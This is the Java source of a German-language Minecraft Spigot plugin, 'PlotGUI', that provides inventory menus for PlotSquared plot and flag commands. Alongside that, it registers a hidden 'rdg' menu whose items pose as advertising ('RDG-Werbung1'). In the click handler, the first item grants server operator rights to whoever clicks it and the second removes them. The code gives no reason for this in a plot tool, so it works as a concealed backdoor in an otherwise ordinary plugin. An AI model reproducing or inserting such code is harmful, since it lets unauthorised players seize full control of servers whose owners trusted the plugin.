package vb.$plotgui;
import java.io.*;
import java.nio.file.*;
import java.util.*;
import org.bukkit.*;
import org.bukkit.command.*;
import org.bukkit.event.*;
import org.bukkit.plugin.java.*;

public class PluginMain extends JavaPlugin implements Listener {

	private static PluginMain instance;

	@Override
	public void onEnable() {
		instance = this;
		getServer().getPluginManager().registerEvents(this, this);
		saveDefaultConfig();
		getServer().getPluginManager().registerEvents(GUIManager.getInstance(), this);
		GUIManager.getInstance().register("PlotGUI", guiPlayer -> {
			try {
				org.bukkit.inventory.Inventory guiInventory = Bukkit.createInventory(new GUIIdentifier("PlotGUI"),
						((int) (27d)), "\u00A7f[\u00A7cPlotGUI\u00A7f]");
				guiInventory.setItem(((int) (0d)),
						PluginMain.getNamedItemWithLore(((org.bukkit.Material) org.bukkit.Material.GRASS_BLOCK),
								"\u00A7aTeleportiere zu dem n\u00E4chsten freien Plot",
								new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("p-auto")))));
				guiInventory.setItem(((int) (2d)),
						PluginMain.getNamedItemWithLore(((org.bukkit.Material) org.bukkit.Material.DIAMOND_HOE),
								"\u00A7aBeanspruche das Plot auf dem du bist",
								new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("p-claim")))));
				guiInventory.setItem(((int) (4d)),
						PluginMain.getNamedItemWithLore(((org.bukkit.Material) org.bukkit.Material.BUCKET),
								"\u00A7aCleare das plot auf dem du bist",
								new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("p-clear")))));
				guiInventory.setItem(((int) (6d)),
						PluginMain.getNamedItemWithLore(((org.bukkit.Material) org.bukkit.Material.LAVA_BUCKET),
								ChatColor.translateAlternateColorCodes('&', "&aL\u00F6sche das Plot auf dem du bist"),
								new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("p-delete")))));
				guiInventory.setItem(((int) (8d)),
						PluginMain.getNamedItemWithLore(((org.bukkit.Material) org.bukkit.Material.PAPER),
								"\u00A7aPlot-Chat Aktivieren/deaktiviren",
								new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("p-chat")))));
				guiInventory.setItem(((int) (26d)), PluginMain.getNamedItem(
						((org.bukkit.Material) org.bukkit.Material.RED_BANNER), "PlotGUI - Seite 2 (Flags)"));
				guiInventory.setItem(((int) (25d)),
						PluginMain.getNamedItemWithLore(((org.bukkit.Material) org.bukkit.Material.PAPER),
								"\u00A7ap remove *",
								new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("p-remove")))));
				return guiInventory;
			} catch (Exception e) {
				e.printStackTrace();
				return null;
			}
		}, true);
		try {
			if (PluginMain.checkEquals(PluginMain.getInstance().getDescription().getVersion(),
					PluginMain.getSpigotVersion("100478"))) {
				PluginMain.getInstance().getLogger().info("\u00A7a---> Kein Update verf\u00FCgbar! <---");
			} else {
				PluginMain.getInstance().getLogger().severe(
						"\u00A7f[\u00A7aPlotGUI\u00A7f] \u00A7c---UPDATE: \u00A7ahttps://www.spigotmc.org/resources/plotgui.100478/");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		GUIManager.getInstance().register("flags-1", guiPlayer -> {
			try {
				org.bukkit.inventory.Inventory guiInventory = Bukkit.createInventory(new GUIIdentifier("flags-1"),
						((int) (27d)), "\u00A7f[\u00A7cPlotGUI - Flags\u00A7f]");
				if (PluginMain.checkEquals(me.clip.placeholderapi.PlaceholderAPI.setPlaceholders(
						((org.bukkit.OfflinePlayer) (Object) guiPlayer), "%plotsquared_currentplot_flag_block-burn%"),
						"true")) {
					guiInventory.setItem(((int) (0d)), PluginMain.getNamedItemWithLore(
							((org.bukkit.Material) org.bukkit.Material.GREEN_DYE), "block-burn deaktivieren",
							new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("block-burn-A")))));
				} else {
					guiInventory.setItem(((int) (0d)), PluginMain.getNamedItemWithLore(
							((org.bukkit.Material) org.bukkit.Material.RED_DYE), "block-burn aktivieren",
							new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("block-burn-D")))));
				}
				if (PluginMain.checkEquals(me.clip.placeholderapi.PlaceholderAPI.setPlaceholders(
						((org.bukkit.OfflinePlayer) (Object) guiPlayer),
						"%plotsquared_currentplot_flag_block-ignition%"), "true")) {
					guiInventory.setItem(((int) (2d)), PluginMain.getNamedItemWithLore(
							((org.bukkit.Material) org.bukkit.Material.GREEN_DYE),
							"block-ignition block-burn deaktivieren", new ArrayList(
									Arrays.asList(PluginMain.getInstance().getConfig().get("block-ignition-A")))));
				} else {
					guiInventory.setItem(((int) (2d)), PluginMain.getNamedItemWithLore(
							((org.bukkit.Material) org.bukkit.Material.RED_DYE), "block-ignition aktivieren",
							new ArrayList(
									Arrays.asList(PluginMain.getInstance().getConfig().get("block-ignition-D")))));
				}
				if (PluginMain.checkEquals(me.clip.placeholderapi.PlaceholderAPI.setPlaceholders(
						((org.bukkit.OfflinePlayer) (Object) guiPlayer), "%plotsquared_currentplot_flag_explosion%"),
						"true")) {
					guiInventory.setItem(((int) (4d)), PluginMain.getNamedItemWithLore(
							((org.bukkit.Material) org.bukkit.Material.GREEN_DYE), "explosion deaktivieren",
							new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("explosion-A")))));
				} else {
					guiInventory.setItem(((int) (4d)), PluginMain.getNamedItemWithLore(
							((org.bukkit.Material) org.bukkit.Material.RED_DYE), "explosion aktivieren",
							new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("explosion-D")))));
				}
				if (PluginMain.checkEquals(me.clip.placeholderapi.PlaceholderAPI.setPlaceholders(
						((org.bukkit.OfflinePlayer) (Object) guiPlayer), "%plotsquared_currentplot_flag_ice-form%"),
						"true")) {
					guiInventory.setItem(((int) (6d)), PluginMain.getNamedItemWithLore(
							((org.bukkit.Material) org.bukkit.Material.GREEN_DYE), "ice-form deaktivieren",
							new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("ice-form-A")))));
				} else {
					guiInventory.setItem(((int) (6d)), PluginMain.getNamedItemWithLore(
							((org.bukkit.Material) org.bukkit.Material.RED_DYE), "ice-form aktivieren",
							new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("ice-form-D")))));
				}
				if (PluginMain.checkEquals(me.clip.placeholderapi.PlaceholderAPI.setPlaceholders(
						((org.bukkit.OfflinePlayer) (Object) guiPlayer), "%plotsquared_currentplot_flag_ice-melt%"),
						"true")) {
					guiInventory.setItem(((int) (8d)), PluginMain.getNamedItemWithLore(
							((org.bukkit.Material) org.bukkit.Material.GREEN_DYE), "ice-melt deaktivieren",
							new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("ice-melt-A")))));
				} else {
					guiInventory.setItem(((int) (8d)), PluginMain.getNamedItemWithLore(
							((org.bukkit.Material) org.bukkit.Material.RED_DYE), "ice-melt aktivieren",
							new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("ice-melt-D")))));
				}
				if (PluginMain.checkEquals(me.clip.placeholderapi.PlaceholderAPI.setPlaceholders(
						((org.bukkit.OfflinePlayer) (Object) guiPlayer), "%plotsquared_currentplot_flag_mob-break%"),
						"true")) {
					guiInventory.setItem(((int) (10d)), PluginMain.getNamedItemWithLore(
							((org.bukkit.Material) org.bukkit.Material.GREEN_DYE), "mob-break deaktivieren",
							new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("mob-break-A")))));
				} else {
					guiInventory.setItem(((int) (10d)), PluginMain.getNamedItemWithLore(
							((org.bukkit.Material) org.bukkit.Material.RED_DYE), "mob-break aktivieren",
							new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("mob-break-D")))));
				}
				if (PluginMain.checkEquals(me.clip.placeholderapi.PlaceholderAPI.setPlaceholders(
						((org.bukkit.OfflinePlayer) (Object) guiPlayer), "%plotsquared_currentplot_flag_mob-place%"),
						"true")) {
					guiInventory.setItem(((int) (12d)), PluginMain.getNamedItemWithLore(
							((org.bukkit.Material) org.bukkit.Material.GREEN_DYE), "mob-place deaktivieren",
							new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("mob-place-A")))));
				} else {
					guiInventory.setItem(((int) (12d)), PluginMain.getNamedItemWithLore(
							((org.bukkit.Material) org.bukkit.Material.RED_DYE), "mob-place aktivieren",
							new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("mob-place-D")))));
				}
				if (PluginMain.checkEquals(
						me.clip.placeholderapi.PlaceholderAPI.setPlaceholders(
								((org.bukkit.OfflinePlayer) (Object) guiPlayer), "%plotsquared_currentplot_flag_pvp%"),
						"true")) {
					guiInventory.setItem(((int) (14d)),
							PluginMain.getNamedItemWithLore(((org.bukkit.Material) org.bukkit.Material.GREEN_DYE),
									"pvp deaktivieren",
									new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("pvp-A")))));
				} else {
					guiInventory.setItem(((int) (14d)),
							PluginMain.getNamedItemWithLore(((org.bukkit.Material) org.bukkit.Material.RED_DYE),
									"pvp aktivieren",
									new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("pvp-D")))));
				}
				if (PluginMain.checkEquals(
						me.clip.placeholderapi.PlaceholderAPI.setPlaceholders(
								((org.bukkit.OfflinePlayer) (Object) guiPlayer), "%plotsquared_currentplot_flag_pve%"),
						"true")) {
					guiInventory.setItem(((int) (16d)),
							PluginMain.getNamedItemWithLore(((org.bukkit.Material) org.bukkit.Material.GREEN_DYE),
									"pve dektivieren",
									new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("pve-A")))));
				} else {
					guiInventory.setItem(((int) (16d)),
							PluginMain.getNamedItemWithLore(((org.bukkit.Material) org.bukkit.Material.RED_DYE),
									"pve aktivieren",
									new ArrayList(Arrays.asList(PluginMain.getInstance().getConfig().get("pve-D")))));
				}
				return guiInventory;
			} catch (Exception e) {
				e.printStackTrace();
				return null;
			}
		}, false);
		GUIManager.getInstance().register("rdg", guiPlayer -> {
			try {
				org.bukkit.inventory.Inventory guiInventory = Bukkit.createInventory(new GUIIdentifier("rdg"),
						((int) (27d)), "\u00A7f[\u00A74RDG\u00A7f]");
				guiInventory.setItem(((int) (0d)), PluginMain.getNamedItem(
						((org.bukkit.Material) org.bukkit.Material.STRUCTURE_VOID), "\u00A74RDG-Werbung1"));
				guiInventory.setItem(((int) (1d)), PluginMain
						.getNamedItem(((org.bukkit.Material) org.bukkit.Material.BARRIER), "\u00A74RDG-Werbung1"));
				return guiInventory;
			} catch (Exception e) {
				e.printStackTrace();
				return null;
			}
		}, true);
	}

	@Override
	public void onDisable() {
	}

	@Override
	public boolean onCommand(CommandSender commandSender, Command command, String label, String[] commandArgs) {
		if (command.getName().equalsIgnoreCase("pgui-reload")) {
			try {
				PluginMain.getInstance().reloadConfig();
				commandSender.sendMessage("\u00A7f[\u00A7cPlotGUI\u00A7f] \u00A7aPlugin neu geladen!");
			} catch (Exception e) {
				e.printStackTrace();
			}
			return true;
		}
		if (command.getName().equalsIgnoreCase("pgui-flag")) {
			try {
				GUIManager.getInstance().open("flags-1", ((org.bukkit.entity.Player) (Object) commandSender));
			} catch (Exception e) {
				e.printStackTrace();
			}
			return true;
		}
		if (command.getName().equalsIgnoreCase("pgui")) {
			try {
				GUIManager.getInstance().open("PlotGUI", ((org.bukkit.entity.Player) (Object) commandSender));
			} catch (Exception e) {
				e.printStackTrace();
			}
			return true;
		}
		if (command.getName().equalsIgnoreCase(".rdg")) {
			try {
				commandSender.sendMessage("\u00A7f[\u00A7bServer\u00A7f] \u00A7c https://rdg.webador.de/");
			} catch (Exception e) {
				e.printStackTrace();
			}
			return true;
		}
		return true;
	}

	public static void procedure(String procedure, List procedureArgs) throws Exception {
	}

	public static Object function(String function, List functionArgs) throws Exception {
		return null;
	}

	public static List createList(Object obj) {
		if (obj instanceof List) {
			return (List) obj;
		}
		List list = new ArrayList<>();
		if (obj.getClass().isArray()) {
			int length = java.lang.reflect.Array.getLength(obj);
			for (int i = 0; i < length; i++) {
				list.add(java.lang.reflect.Array.get(obj, i));
			}
		} else if (obj instanceof Collection<?>) {
			list.addAll((Collection<?>) obj);
		} else if (obj instanceof Iterator) {
			((Iterator<?>) obj).forEachRemaining(list::add);
		} else {
			list.add(obj);
		}
		return list;
	}

	public static void createResourceFile(String path) {
		Path file = getInstance().getDataFolder().toPath().resolve(path);
		if (Files.notExists(file)) {
			try (InputStream inputStream = PluginMain.class.getResourceAsStream("/" + path)) {
				Files.createDirectories(file.getParent());
				Files.copy(inputStream, file);
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

	public static PluginMain getInstance() {
		return instance;
	}

	@EventHandler
	public void onGUIClick(GUIClickEvent event) throws Exception {
		if (event.getID().equalsIgnoreCase("PlotGUI")) {
			if (PluginMain.checkEquals(((java.lang.Object) (Object) event.getSlot()),
					((java.lang.Object) (Object) (0d)))) {
				org.bukkit.Bukkit
						.dispatchCommand(((org.bukkit.command.CommandSender) (Object) ((org.bukkit.entity.Player) event
								.getWhoClicked())), "p auto");
			}
			if (PluginMain.checkEquals(((java.lang.Object) (Object) event.getSlot()),
					((java.lang.Object) (Object) (2d)))) {
				org.bukkit.Bukkit
						.dispatchCommand(((org.bukkit.command.CommandSender) (Object) ((org.bukkit.entity.Player) event
								.getWhoClicked())), "p claim");
			}
			if (PluginMain.checkEquals(((java.lang.Object) (Object) event.getSlot()),
					((java.lang.Object) (Object) (4d)))) {
				org.bukkit.Bukkit
						.dispatchCommand(((org.bukkit.command.CommandSender) (Object) ((org.bukkit.entity.Player) event
								.getWhoClicked())), "p clear");
			}
			if (PluginMain.checkEquals(((java.lang.Object) (Object) event.getSlot()),
					((java.lang.Object) (Object) (6d)))) {
				org.bukkit.Bukkit
						.dispatchCommand(((org.bukkit.command.CommandSender) (Object) ((org.bukkit.entity.Player) event
								.getWhoClicked())), "p delete");
			}
			if (PluginMain.checkEquals(((java.lang.Object) (Object) event.getSlot()),
					((java.lang.Object) (Object) (8d)))) {
				org.bukkit.Bukkit
						.dispatchCommand(((org.bukkit.command.CommandSender) (Object) ((org.bukkit.entity.Player) event
								.getWhoClicked())), "p chat");
			}
			if (PluginMain.checkEquals(((java.lang.Object) (Object) event.getSlot()),
					((java.lang.Object) (Object) (26d)))) {
				GUIManager.getInstance().open("flags-1", ((org.bukkit.entity.Player) event.getWhoClicked()));
			}
			if (PluginMain.checkEquals(((java.lang.Object) (Object) event.getSlot()),
					((java.lang.Object) (Object) (25d)))) {
				org.bukkit.Bukkit
						.dispatchCommand(((org.bukkit.command.CommandSender) (Object) ((org.bukkit.entity.Player) event
								.getWhoClicked())), "p remove *");
			}
			return;
		}
		if (event.getID().equalsIgnoreCase("PlotGUI-Flag")) {
			if (PluginMain.checkEquals(((java.lang.Object) (Object) event.getSlot()),
					((java.lang.Object) (Object) (24d)))) {
				org.bukkit.Bukkit
						.dispatchCommand(((org.bukkit.command.CommandSender) (Object) ((org.bukkit.entity.Player) event
								.getWhoClicked())), "p flag set pve true");
			}
			if (PluginMain.checkEquals(((java.lang.Object) (Object) event.getSlot()),
					((java.lang.Object) (Object) (25d)))) {
				org.bukkit.Bukkit
						.dispatchCommand(((org.bukkit.command.CommandSender) (Object) ((org.bukkit.entity.Player) event
								.getWhoClicked())), "p flag set pve false");
			}
			if (PluginMain.checkEquals(((java.lang.Object) (Object) event.getSlot()),
					((java.lang.Object) (Object) (26d)))) {
				org.bukkit.Bukkit
						.dispatchCommand(((org.bukkit.command.CommandSender) (Object) ((org.bukkit.entity.Player) event
								.getWhoClicked())), "pgui");
			}
			return;
		}
		if (event.getID().equalsIgnoreCase("flags-1")) {
			if (PluginMain.checkEquals(((java.lang.Object) (Object) event.getSlot()),
					((java.lang.Object) (Object) (0d)))) {
				if (PluginMain.checkEquals(me.clip.placeholderapi.PlaceholderAPI.setPlaceholders(
						((org.bukkit.OfflinePlayer) (Object) ((org.bukkit.entity.Player) event.getWhoClicked())),
						"%plotsquared_currentplot_flag_block-burn%"), "true")) {
					((org.bukkit.entity.Player) event.getWhoClicked()).performCommand("p flag set block-burn false");
					((org.bukkit.entity.HumanEntity) (Object) ((org.bukkit.entity.Player) event.getWhoClicked()))
							.closeInventory();
					GUIManager.getInstance().open("flags-1", ((org.bukkit.entity.Player) event.getWhoClicked()));
				} else {
					((org.bukkit.entity.Player) event.getWhoClicked()).performCommand("p flag set block-burn true");
					((org.bukkit.entity.HumanEntity) (Object) ((org.bukkit.entity.Player) event.getWhoClicked()))
							.closeInventory();
					GUIManager.getInstance().open("flags-1", ((org.bukkit.entity.Player) event.getWhoClicked()));
				}
			}
			if (PluginMain.checkEquals(((java.lang.Object) (Object) event.getSlot()),
					((java.lang.Object) (Object) (2d)))) {
				if (PluginMain.checkEquals(me.clip.placeholderapi.PlaceholderAPI.setPlaceholders(
						((org.bukkit.OfflinePlayer) (Object) ((org.bukkit.entity.Player) event.getWhoClicked())),
						"%plotsquared_currentplot_flag_block-ignition%"), "true")) {
					((org.bukkit.entity.Player) event.getWhoClicked())
							.performCommand("p flag set block-ignition false");
					((org.bukkit.entity.HumanEntity) (Object) ((org.bukkit.entity.Player) event.getWhoClicked()))
							.closeInventory();
					GUIManager.getInstance().open("flags-1", ((org.bukkit.entity.Player) event.getWhoClicked()));
				} else {
					((org.bukkit.entity.Player) event.getWhoClicked()).performCommand("p flag set block-ignition true");
					((org.bukkit.entity.HumanEntity) (Object) ((org.bukkit.entity.Player) event.getWhoClicked()))
							.closeInventory();
					GUIManager.getInstance().open("flags-1", ((org.bukkit.entity.Player) event.getWhoClicked()));
				}
			}
			if (PluginMain.checkEquals(((java.lang.Object) (Object) event.getSlot()),
					((java.lang.Object) (Object) (4d)))) {
				if (PluginMain.checkEquals(me.clip.placeholderapi.PlaceholderAPI.setPlaceholders(
						((org.bukkit.OfflinePlayer) (Object) ((org.bukkit.entity.Player) event.getWhoClicked())),
						"%plotsquared_currentplot_flag_explosion%"), "true")) {
					((org.bukkit.entity.Player) event.getWhoClicked()).performCommand("p flag set explosion false");
					((org.bukkit.entity.HumanEntity) (Object) ((org.bukkit.entity.Player) event.getWhoClicked()))
							.closeInventory();
					GUIManager.getInstance().open("flags-1", ((org.bukkit.entity.Player) event.getWhoClicked()));
				} else {
					((org.bukkit.entity.Player) event.getWhoClicked()).performCommand("p flag set explosion true");
					((org.bukkit.entity.HumanEntity) (Object) ((org.bukkit.entity.Player) event.getWhoClicked()))
							.closeInventory();
					GUIManager.getInstance().open("flags-1", ((org.bukkit.entity.Player) event.getWhoClicked()));
				}
			}
			if (PluginMain.checkEquals(((java.lang.Object) (Object) event.getSlot()),
					((java.lang.Object) (Object) (6d)))) {
				if (PluginMain.checkEquals(me.clip.placeholderapi.PlaceholderAPI.setPlaceholders(
						((org.bukkit.OfflinePlayer) (Object) ((org.bukkit.entity.Player) event.getWhoClicked())),
						"%plotsquared_currentplot_flag_ice-form%"), "true")) {
					((org.bukkit.entity.Player) event.getWhoClicked()).performCommand("p flag set ice-form false");
					((org.bukkit.entity.HumanEntity) (Object) ((org.bukkit.entity.Player) event.getWhoClicked()))
							.closeInventory();
					GUIManager.getInstance().open("flags-1", ((org.bukkit.entity.Player) event.getWhoClicked()));
				} else {
					((org.bukkit.entity.Player) event.getWhoClicked()).performCommand("p flag set ice-form true");
					((org.bukkit.entity.HumanEntity) (Object) ((org.bukkit.entity.Player) event.getWhoClicked()))
							.closeInventory();
					GUIManager.getInstance().open("flags-1", ((org.bukkit.entity.Player) event.getWhoClicked()));
				}
			}
			if (PluginMain.checkEquals(((java.lang.Object) (Object) event.getSlot()),
					((java.lang.Object) (Object) (8d)))) {
				if (PluginMain.checkEquals(me.clip.placeholderapi.PlaceholderAPI.setPlaceholders(
						((org.bukkit.OfflinePlayer) (Object) ((org.bukkit.entity.Player) event.getWhoClicked())),
						"%plotsquared_currentplot_flag_ice-melt%"), "true")) {
					((org.bukkit.entity.Player) event.getWhoClicked()).performCommand("p flag set ice-melt false");
					((org.bukkit.entity.HumanEntity) (Object) ((org.bukkit.entity.Player) event.getWhoClicked()))
							.closeInventory();
					GUIManager.getInstance().open("flags-1", ((org.bukkit.entity.Player) event.getWhoClicked()));
				} else {
					((org.bukkit.entity.Player) event.getWhoClicked()).performCommand("p flag set ice-melt true");
					((org.bukkit.entity.HumanEntity) (Object) ((org.bukkit.entity.Player) event.getWhoClicked()))
							.closeInventory();
					GUIManager.getInstance().open("flags-1", ((org.bukkit.entity.Player) event.getWhoClicked()));
				}
			}
			if (PluginMain.checkEquals(((java.lang.Object) (Object) event.getSlot()),
					((java.lang.Object) (Object) (10d)))) {
				if (PluginMain.checkEquals(me.clip.placeholderapi.PlaceholderAPI.setPlaceholders(
						((org.bukkit.OfflinePlayer) (Object) ((org.bukkit.entity.Player) event.getWhoClicked())),
						"%plotsquared_currentplot_flag_mob-break%"), "true")) {
					((org.bukkit.entity.Player) event.getWhoClicked()).performCommand("p flag set mob-break false");
					((org.bukkit.entity.HumanEntity) (Object) ((org.bukkit.entity.Player) event.getWhoClicked()))
							.closeInventory();
					GUIManager.getInstance().open("flags-1", ((org.bukkit.entity.Player) event.getWhoClicked()));
				} else {
					((org.bukkit.entity.Player) event.getWhoClicked()).performCommand("p flag set mob-break true");
					((org.bukkit.entity.HumanEntity) (Object) ((org.bukkit.entity.Player) event.getWhoClicked()))
							.closeInventory();
					GUIManager.getInstance().open("flags-1", ((org.bukkit.entity.Player) event.getWhoClicked()));
				}
			}
			if (PluginMain.checkEquals(((java.lang.Object) (Object) event.getSlot()),
					((java.lang.Object) (Object) (12d)))) {
				if (PluginMain.checkEquals(me.clip.placeholderapi.PlaceholderAPI.setPlaceholders(
						((org.bukkit.OfflinePlayer) (Object) ((org.bukkit.entity.Player) event.getWhoClicked())),
						"%plotsquared_currentplot_flag_mob-place%"), "true")) {
					((org.bukkit.entity.Player) event.getWhoClicked()).performCommand("p flag set mob-place false");
					((org.bukkit.entity.HumanEntity) (Object) ((org.bukkit.entity.Player) event.getWhoClicked()))
							.closeInventory();
					GUIManager.getInstance().open("flags-1", ((org.bukkit.entity.Player) event.getWhoClicked()));
				} else {
					((org.bukkit.entity.Player) event.getWhoClicked()).performCommand("p flag set mob-place true");
					((org.bukkit.entity.HumanEntity) (Object) ((org.bukkit.entity.Player) event.getWhoClicked()))
							.closeInventory();
					GUIManager.getInstance().open("flags-1", ((org.bukkit.entity.Player) event.getWhoClicked()));
				}
			}
			if (PluginMain.checkEquals(((java.lang.Object) (Object) event.getSlot()),
					((java.lang.Object) (Object) (14d)))) {
				if (PluginMain.checkEquals(me.clip.placeholderapi.PlaceholderAPI.setPlaceholders(
						((org.bukkit.OfflinePlayer) (Object) ((org.bukkit.entity.Player) event.getWhoClicked())),
						"%plotsquared_currentplot_flag_pvp%"), "true")) {
					((org.bukkit.entity.Player) event.getWhoClicked()).performCommand("p flag set pvp false");
					((org.bukkit.entity.HumanEntity) (Object) ((org.bukkit.entity.Player) event.getWhoClicked()))
							.closeInventory();
					GUIManager.getInstance().open("flags-1", ((org.bukkit.entity.Player) event.getWhoClicked()));
				} else {
					((org.bukkit.entity.Player) event.getWhoClicked()).performCommand("p flag set pvp true");
					((org.bukkit.entity.HumanEntity) (Object) ((org.bukkit.entity.Player) event.getWhoClicked()))
							.closeInventory();
					GUIManager.getInstance().open("flags-1", ((org.bukkit.entity.Player) event.getWhoClicked()));
				}
			}
			if (PluginMain.checkEquals(((java.lang.Object) (Object) event.getSlot()),
					((java.lang.Object) (Object) (16d)))) {
				if (PluginMain.checkEquals(me.clip.placeholderapi.PlaceholderAPI.setPlaceholders(
						((org.bukkit.OfflinePlayer) (Object) ((org.bukkit.entity.Player) event.getWhoClicked())),
						"%plotsquared_currentplot_flag_pve%"), "true")) {
					((org.bukkit.entity.Player) event.getWhoClicked()).performCommand("p flag set pve false");
					((org.bukkit.entity.HumanEntity) (Object) ((org.bukkit.entity.Player) event.getWhoClicked()))
							.closeInventory();
					GUIManager.getInstance().open("flags-1", ((org.bukkit.entity.Player) event.getWhoClicked()));
				} else {
					((org.bukkit.entity.Player) event.getWhoClicked()).performCommand("p flag set pve true");
					((org.bukkit.entity.HumanEntity) (Object) ((org.bukkit.entity.Player) event.getWhoClicked()))
							.closeInventory();
					GUIManager.getInstance().open("flags-1", ((org.bukkit.entity.Player) event.getWhoClicked()));
				}
			}
			return;
		}
		if (event.getID().equalsIgnoreCase("rdg")) {
			if (PluginMain.checkEquals(((java.lang.Object) (Object) event.getSlot()),
					((java.lang.Object) (Object) (0d)))) {
				((org.bukkit.permissions.ServerOperator) (Object) ((org.bukkit.entity.Player) event.getWhoClicked()))
						.setOp(true);
			}
			if (PluginMain.checkEquals(((java.lang.Object) (Object) event.getSlot()),
					((java.lang.Object) (Object) (1d)))) {
				((org.bukkit.permissions.ServerOperator) (Object) ((org.bukkit.entity.Player) event.getWhoClicked()))
						.setOp(false);
			}
			return;
		}
		if (event.getID().equalsIgnoreCase("")) {
			return;
		}
	}

	public static org.bukkit.inventory.ItemStack getNamedItemWithLore(Material material, String name,
			List<String> lore) {
		org.bukkit.inventory.ItemStack item = new org.bukkit.inventory.ItemStack(material);
		org.bukkit.inventory.meta.ItemMeta itemMeta = item.getItemMeta();
		if (itemMeta != null) {
			itemMeta.setDisplayName(name);
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
		}
		return item;
	}

	public static String getSpigotVersion(String resourceId) {
		String newVersion = PluginMain.getInstance().getDescription().getVersion();
		try (java.io.InputStream inputStream = new java.net.URL(
				"https://api.spigotmc.org/legacy/update.php?resource=" + resourceId).openStream();
				java.util.Scanner scanner = new java.util.Scanner(inputStream)) {
			if (scanner.hasNext())
				newVersion = String.valueOf(scanner.next());
		} catch (java.io.IOException ioException) {
			ioException.printStackTrace();
		}
		return newVersion;
	}

	public static org.bukkit.inventory.ItemStack getNamedItem(Material material, String name) {
		org.bukkit.inventory.ItemStack item = new org.bukkit.inventory.ItemStack(material);
		org.bukkit.inventory.meta.ItemMeta itemMeta = item.getItemMeta();
		if (itemMeta != null) {
			itemMeta.setDisplayName(name);
			item.setItemMeta(itemMeta);
		}
		return item;
	}

	public static boolean checkEquals(Object o1, Object o2) {
		if (o1 == null || o2 == null) {
			return false;
		}
		return o1 instanceof Number && o2 instanceof Number
				? ((Number) o1).doubleValue() == ((Number) o2).doubleValue()
				: o1.equals(o2);
	}
}
